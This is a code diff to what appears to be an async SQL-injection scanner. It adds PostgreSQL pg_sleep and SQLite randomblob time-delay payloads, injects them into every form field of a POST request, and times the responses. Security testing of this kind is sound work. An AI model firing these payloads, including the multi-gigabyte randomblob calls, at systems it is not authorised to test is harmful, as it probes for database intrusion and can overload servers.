@@ -7,19 +7,29 @@ import time
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+
 async def test_time_based_sql_injection(session, url, data, expected_delay=5):
     payloads = [
         "';WAITFOR DELAY '0:0:5';--",
         "';WAITFOR DELAY '0:0:10';--",
         "';WAITFOR DELAY '0:0:15';--",
+        "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END --",
+        "'; SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE 1 END --",
+        "'; SELECT pg_sleep(5) --",
+        "'; SELECT randomblob(1000000000); --",
+        "'; SELECT randomblob(2000000000); --",
+        "'; SELECT randomblob(3000000000); --",
     ]
     for payload in payloads:
         injected_data = {k: v + payload for k, v in data.items()}
         logger.info(f"Testing time-based SQL injection with payload: {payload}")
-        start_time = time.time()
+
+        start_time = time.perf_counter()
         async with session.post(url, data=injected_data) as response:
             await response.text()
-        response_time = time.time() - start_time
+        response_time = time.perf_counter() - start_time
+
+        logger.info(f"Response time: {response_time:.2f} seconds for payload: {payload}")
         if response_time >= expected_delay:
             return {
                 'url': url,
